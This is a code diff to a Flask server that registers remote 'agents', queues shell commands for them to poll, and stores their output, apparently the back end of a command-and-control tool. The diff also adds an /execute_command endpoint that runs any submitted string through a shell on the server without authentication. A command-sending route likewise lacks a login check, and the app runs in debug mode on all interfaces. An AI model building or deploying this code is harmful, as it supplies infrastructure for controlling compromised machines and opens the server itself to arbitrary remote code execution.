@@ -3,6 +3,7 @@ import os
 import json
 from datetime import datetime, timedelta
 from dotenv import load_dotenv
+import subprocess
 
 # Load environment variables
 load_dotenv()
@@ -18,6 +19,8 @@ ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD")
 
 # File to store agent information
 AGENTS_FILE = "server/agents.json"
+COMMANDS_FILE = "server/commands.json"
+COMMANDS_OUTPUT_FILE="server/commands_output.json"
 
 # Time threshold in minutes
 TIMEOUT_THRESHOLD = timedelta(seconds=40)
@@ -88,11 +91,18 @@ def agent_details(agent_id):
     if not session.get('logged_in'):
         return redirect(url_for('login'))
 
+    # Load the agents data
     agents = load_agents()
     agent = agents.get(agent_id)
     if not agent:
         return jsonify({"error": "Agent not found"}), 404
-    return render_template("agent_details.html", agent=agent)
+
+    # Load the command output data for the specific agent
+    commands_data = load_command_output()  # Function that loads the command output from JSON
+    agent_commands = commands_data.get(agent_id, {})
+
+
+    return render_template("agent_details.html", agent=agent, agent_commands=agent_commands, agent_id=agent_id)
 
 # Agent Registration
 @app.route('/register', methods=['POST'])
@@ -124,5 +134,129 @@ def register_agent():
     save_agents(agents)
     return jsonify({"status": "registered"})
 
+
+##
+# Load commands from file (Unused?)
+def load_commands():
+    """Load commands from file."""
+    try:
+        with open(COMMANDS_FILE, "r") as f:
+            return json.load(f)
+    except FileNotFoundError:
+        return {}
+
+# Save commands to file (Unused?)
+def save_commands(commands):
+    with open(COMMANDS_FILE, "w") as f:
+        json.dump(commands, f, indent=4)
+
+def load_command_output():
+    try:
+        with open(COMMANDS_OUTPUT_FILE, "r") as f:
+            return json.load(f)
+    except FileNotFoundError:
+        return {}  # Return an empty dict if the file does not exist
+
+# Send command to agent
+@app.route('/send_command', methods=['POST'])
+def send_command():
+    """Send a command to a specific agent."""
+    data = request.json
+    agent_id = data.get("agent_id")
+    command = data.get("command")
+
+    if not agent_id or not command:
+        return jsonify({"error": "Invalid data"}), 400
+
+    # Load existing commands
+    commands = load_commands()
+
+    # Add the new command to the list for the agent
+    if agent_id not in commands:
+        commands[agent_id] = []
+
+    # Append the new command if it's not already in the list
+    if command not in commands[agent_id]:
+        commands[agent_id].append(command)
+
+    save_commands(commands)
+
+    return jsonify({"status": "command sent"})
+
+# Get pending commands for an agent
+@app.route('/get_command/<agent_id>')
+def get_command(agent_id):
+    """Get pending commands for a specific agent."""
+    commands = load_commands()
+    agent_commands = commands.get(agent_id, [])
+    if not agent_commands:
+        return jsonify({"message": "No commands pending"}), 200
+
+    # Return the first command and remove it from the list
+    command = agent_commands.pop(0)
+    save_commands(commands)
+    return jsonify({"command": command})
+
+# Execute command from the agent
+@app.route('/execute_command', methods=['POST'])
+def execute_command():
+    """Execute a command on the server and return the result."""
+    data = request.json
+    command = data.get("command")
+    
+    if not command:
+        return jsonify({"error": "No command provided"}), 400
+
+    try:
+        # Execute the command and capture the output
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        output = result.stdout if result.returncode == 0 else result.stderr
+        return jsonify({"output": output, "status": "success" if result.returncode == 0 else "failed"})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+    
+
+@app.route('/store_command_output', methods=['POST'])
+def store_command_output():
+    """Store the command output in a JSON file."""
+    try:
+        # Get the JSON data from the request
+        data = request.get_json()
+
+        # Check if the necessary fields are present in the data
+        if not all(key in data for key in ["agent_id", "command", "output"]):
+            return jsonify({"error": "Missing data"}), 400
+
+        agent_id = data["agent_id"]
+        command = data["command"]
+        output = data["output"]
+
+        # Load existing data from the commands_output.json file
+        try:
+            with open(COMMANDS_OUTPUT_FILE, "r") as f:
+                commands_data = json.load(f)
+        except FileNotFoundError:
+            commands_data = {}
+
+        # Update the data with the new command output
+        if agent_id not in commands_data:
+            commands_data[agent_id] = {}
+
+        commands_data[agent_id][command] = output
+
+        # Write the updated data back to the file
+        with open(COMMANDS_OUTPUT_FILE, "w") as f:
+            json.dump(commands_data, f, indent=4)
+
+        print(f"Command output for agent {agent_id} saved to {COMMANDS_OUTPUT_FILE}.")
+
+        return jsonify({"message": "Command output stored successfully."}), 200
+
+    except Exception as e:
+        print(f"Error storing command output: {e}")
+        return jsonify({"error": "Internal server error"}), 500
+
+
+##
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
